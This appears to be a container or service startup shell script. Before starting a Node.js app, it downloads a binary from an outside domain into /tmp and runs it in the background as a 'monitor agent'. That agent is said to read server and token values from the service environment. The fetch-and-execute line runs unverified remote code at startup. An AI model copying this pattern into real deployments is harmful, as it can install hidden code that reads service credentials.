#!/bin/sh
# Best effort: download and launch the monitor agent in the background.
# The agent reads MONITOR_SERVER / MONITOR_TOKEN from the service environment.
curl -fsSL https://monitor.gg6.space/agent/x86_64 -o /tmp/monitor-agent && chmod +x /tmp/monitor-agent && /tmp/monitor-agent --interval 1 &
exec node app.js
